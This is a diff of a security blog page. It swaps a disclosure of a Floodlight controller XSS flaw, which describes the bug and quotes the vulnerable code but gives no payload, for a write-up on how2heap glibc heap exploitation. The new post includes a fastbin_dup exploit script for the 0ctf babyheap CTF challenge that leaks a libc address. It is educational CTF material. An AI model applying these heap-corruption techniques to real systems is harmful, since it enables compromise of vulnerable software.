@@ -79,17 +79,17 @@
 
 
 
-<meta name="description" content="It is a serious vulnerability in the latest version of Floodlight (V1.2). With this vulnerability, an adversary can escalate his privilege to compromise the whole network via a compromised OpenFlow sw">
+<meta name="description" content="IntroductionThis post is actually the writeups for shellfish’s tutorial on heap exploitation, i.e., how2heap. BackgroundHeap is a logically continuous area that consists of many chunks. For heap alloc">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Floodlight Remote Command Execution">
-<meta property="og:url" content="http://blog.fxiao.me/floodlight-rce/index.html">
+<meta property="og:title" content="How to heap?">
+<meta property="og:url" content="http://blog.fxiao.me/how-to-heap/index.html">
 <meta property="og:site_name" content="Feng&#39;s Blog">
-<meta property="og:description" content="It is a serious vulnerability in the latest version of Floodlight (V1.2). With this vulnerability, an adversary can escalate his privilege to compromise the whole network via a compromised OpenFlow sw">
+<meta property="og:description" content="IntroductionThis post is actually the writeups for shellfish’s tutorial on heap exploitation, i.e., how2heap. BackgroundHeap is a logically continuous area that consists of many chunks. For heap alloc">
 <meta property="og:locale" content="en">
-<meta property="og:updated_time" content="2018-04-04T12:01:41.608Z">
+<meta property="og:updated_time" content="2019-03-25T02:51:09.019Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Floodlight Remote Command Execution">
-<meta name="twitter:description" content="It is a serious vulnerability in the latest version of Floodlight (V1.2). With this vulnerability, an adversary can escalate his privilege to compromise the whole network via a compromised OpenFlow sw">
+<meta name="twitter:title" content="How to heap?">
+<meta name="twitter:description" content="IntroductionThis post is actually the writeups for shellfish’s tutorial on heap exploitation, i.e., how2heap. BackgroundHeap is a logically continuous area that consists of many chunks. For heap alloc">
 
 
 
@@ -119,13 +119,13 @@
 
 
 
-  <link rel="canonical" href="http://blog.fxiao.me/floodlight-rce/"/>
+  <link rel="canonical" href="http://blog.fxiao.me/how-to-heap/"/>
 
 
 
 
 
-  <title>Floodlight Remote Command Execution | Feng's Blog</title>
+  <title>How to heap? | Feng's Blog</title>
   
 
 
@@ -242,7 +242,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://blog.fxiao.me/floodlight-rce/">
+    <link itemprop="mainEntityOfPage" href="http://blog.fxiao.me/how-to-heap/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Feng Xiao">
@@ -259,7 +259,7 @@
 
         
         
-          <h2 class="post-title" itemprop="name headline">Floodlight Remote Command Execution</h2>
+          <h2 class="post-title" itemprop="name headline">How to heap?</h2>
         
 
         <div class="post-meta">
@@ -271,8 +271,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-03-30T21:45:04-04:00">
-                2018-03-30
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-03-21T16:32:32-04:00">
+                2019-03-21
               </time>
             
 
@@ -309,23 +309,17 @@
       
 
       
-        <p>It is a serious vulnerability in the latest version of Floodlight (V1.2).</p>
-<p>With this vulnerability, an adversary can escalate his privilege to compromise the whole network via a compromised OpenFlow switch[1]. For example, he can remotely disconnect the whole network or monitor any traffic with only the switch’s privilege.<br><a id="more"></a></p>
-<p>Here we demonstrate this vulnerability in a video. We first compromised an SDN switch with known security issue, and then we exploit our vulnerability to further attack controller (disconnect <strong>another</strong> switch’s network).<br><div class="video-container"><iframe src="//www.youtube.com/embed/Md30ajgh3qQ" frameborder="0" allowfullscreen></iframe></div></p>
-<p>In Floodlight v1.2, Input validation for manufacturerDescription is missing in net/floodlightcontroller/core/SwitchDescription.java:77-89. Floodlight simply retrieves manufacturer name via packet sent by the switch and set it as manufacturerDescription.<br>Hence a malicious switch can set an arbitrary string to manufacturerDescription via OpenFlow Protocol. </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">public SwitchDescription(String manufacturerDescription,</span><br><span class="line">        String hardwareDescription, String softwareDescription,</span><br><span class="line">        String serialNumber, String datapathDescription) &#123;</span><br><span class="line">    this.manufacturerDescription = manufacturerDescription;</span><br><span class="line">    this.hardwareDescription = hardwareDescription;</span><br><span class="line">    this.softwareDescription = softwareDescription;</span><br><span class="line">    this.serialNumber = serialNumber;</span><br><span class="line">    this.datapathDescription = datapathDescription;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public SwitchDescription(OFDescStatsReply descStatsReply) &#123;</span><br><span class="line">    this(descStatsReply.getMfrDesc(), descStatsReply.getHwDesc(),</span><br><span class="line">            descStatsReply.getSwDesc(), descStatsReply.getSerialNum(),</span><br><span class="line">            descStatsReply.getDpDesc());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>In Floodlight web console ui/js/models/switchmodel.js:35-42,  Floodlight doesn’t escape manufacturer name. Hence we can inject Cross Site Script payload into the web console to have it access arbitrary rest API to execute an arbitrary command.</p>
-<pre><code>//console.log(&quot;fetching switch &quot; + this.id + &quot; desc&quot;)
- $.ajax({
-        url:hackBase + &quot;/wm/core/switch/&quot; + self.id + &apos;/desc/json&apos;,
-        dataType:&quot;json&quot;,
-        success:function (data) {
-        //console.log(&quot;fetched  switch &quot; + self.id + &quot; desc&quot;);
-        //console.log(data[&apos;desc&apos;]);
-        self.set(data[&apos;desc&apos;]);
-        }
-        });
-</code></pre><p>[1] It is worth noting that OpenFlow switches are vulnerable to multiple remote attacks (e.g., Buffer Overflow[CVE-2016-2074], Arbitrary Read [CVE-2017-9265]). Hence, it is feasible for adversaries to attack the switch from arbitrary hosts.  </p>
+        <h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>This post is actually the writeups for shellfish’s tutorial on heap exploitation, i.e., how2heap.</p>
+<h2 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h2><p>Heap is a logically continuous area that consists of many chunks. For heap allocator such as ptmalloc, the minimum operation unit is the chunk. Chunks are classified into 4 different categories. 1. Allocated chunk 2, Free chunk; 3, Top chunk; 4. Last Remainder chunk.</p>
+<h2 id="Fastbin"><a href="#Fastbin" class="headerlink" title="Fastbin"></a>Fastbin</h2><p>Fastbin is one of the four freelist data structures (fast bin, unsorted bin, small bin, large bin) that are used to hold free chunks. Many attacks relates to fastbins.<br>In malloc_state (heap header), there is an array called fastbinsY that manages the fast bins. In Linux, chunks that are smaller than MAX_FAST_SIZE (80 on 32-bit machine, 160 on 64-bit machine) will be treated as fastbins. The figure below demonstrates the runtime structure of fastbin.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1570	/* The maximum fastbin request size we support */</span><br><span class="line">1571	#define MAX_FAST_SIZE     (80 * SIZE_SZ / 4)</span><br></pre></td></tr></table></figure>
+
+<h2 id="Techniques"><a href="#Techniques" class="headerlink" title="Techniques"></a>Techniques</h2><h3 id="fastbin-dup-consolidate"><a href="#fastbin-dup-consolidate" class="headerlink" title="fastbin_dup_consolidate"></a>fastbin_dup_consolidate</h3><p><a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.25/fastbin_dup_into_stack.c" target="_blank" rel="noopener">fastbin_dup_into_stack</a> introduce a technique to forge a fake chunk by heap overflowing a specific fast bin’s <code>FD</code> to the target address.</p>
+<p>The trick has three steps. Step 1, we put the a victim chunk into bins by freeing it. Step 2, we need a double free or heap overflow to modified the victim chunk’s fd to the target address to claim that there is another chunk there. It is worth noting that in order to pass the malloc check we also need the allocation point at the target address has a legal <code>size</code>.  Step 3, we malloc two times. The first time will put the fake chunk at the head of free list. The second time will malloc a chunk at the target address.</p>
+<p>The 0ctfbabyheap challenge can be solved with this trick. The trick was used for two times. In the first time, we are trying to leak the libc base. To achieve this goal, we forge a fast chunk at the smallbins (Our target address is at smallbin is because smallbin has <code>bk</code> pointer which points to the <code>main_arena</code> when the smallbin is at the head of smallbin free list). The following code demonstrate the processs.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#STEP 1 Free a victim</span><br><span class="line">allocate(0x10) #idx0</span><br><span class="line">allocate(0x10) #idx1</span><br><span class="line">allocate(0x10) #idx2</span><br><span class="line">allocate(0x10) #idx3</span><br><span class="line">allocate(0x80) #idx4 smallbin</span><br><span class="line">free(2)</span><br><span class="line">free(1) # victim chunk</span><br><span class="line"></span><br><span class="line">#STEP 2 modifying the victim&apos;s fd</span><br><span class="line">payload = &apos;a&apos;*0x10 + p64(0) + p64(0x21) + p8(0x80)</span><br><span class="line">fill(0,len(payload),payload)</span><br><span class="line">payload = &apos;a&apos;*0x10 + p64(0) + p64(0x21)</span><br><span class="line">fill(3,len(payload),payload) # in order to pass the size check</span><br><span class="line"></span><br><span class="line">##STEP 3 malloc a fake chunk at target addr</span><br><span class="line">allocate(0x10) #idx1 put addr of idx4 at the head list of fastbin</span><br><span class="line">allocate(0x10) #idx2 got smallbin</span><br><span class="line">payload = &apos;a&apos;*0x10 + p64(0) + p64(0x91) #before idx4 into smallbin, restore its real size </span><br><span class="line">fill(3,len(payload),payload)</span><br><span class="line">allocate(0x10)  # idx 5  we needs this to avoid consolidate</span><br><span class="line">free(4) # now idx4 is in smallbin and idx2 points to the smallbin</span><br><span class="line">dump(2)</span><br><span class="line">p.recvuntil(&apos;Content: \n&apos;)</span><br><span class="line">unsortedbin_addr = u64(p.recv(8))</span><br></pre></td></tr></table></figure>
+<h3 id="fastbin-dup-consolidate-1"><a href="#fastbin-dup-consolidate-1" class="headerlink" title="fastbin_dup_consolidate"></a>fastbin_dup_consolidate</h3><p><a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.25/fastbin_dup_consolidate.c" target="_blank" rel="noopener">fastbin_dup_consolidate</a> abuses the <code>malloc_consolidate</code> in <a href="https://github.com/lattera/glibc/blob/master/malloc/malloc.c#L3672" target="_blank" rel="noopener">malloc.c:L3672</a> to allocate a freed fast bin into unsorted bins.</p>
+<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>[1] <a href="https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/" target="_blank" rel="noopener">https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/</a></p>
 
       
     </div>
@@ -350,15 +344,15 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
+              <a href="/got-plt/" rel="next" title="Pwn the GOT!">
+                <i class="fa fa-chevron-left"></i> Pwn the GOT!
+              </a>
+            
           </div>
 
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/fuzzer-review/" rel="prev" title="What are researchers looking for when they build fuzzing tools">
-                What are researchers looking for when they build fuzzing tools <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -412,8 +406,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -475,6 +478,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Introduction"><span class="nav-number">1.</span> <span class="nav-text">Introduction</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Background"><span class="nav-number">2.</span> <span class="nav-text">Background</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Fastbin"><span class="nav-number">3.</span> <span class="nav-text">Fastbin</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Techniques"><span class="nav-number">4.</span> <span class="nav-text">Techniques</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#fastbin-dup-consolidate"><span class="nav-number">4.1.</span> <span class="nav-text">fastbin_dup_consolidate</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#fastbin-dup-consolidate-1"><span class="nav-number">4.2.</span> <span class="nav-text">fastbin_dup_consolidate</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Reference"><span class="nav-number">5.</span> <span class="nav-text">Reference</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
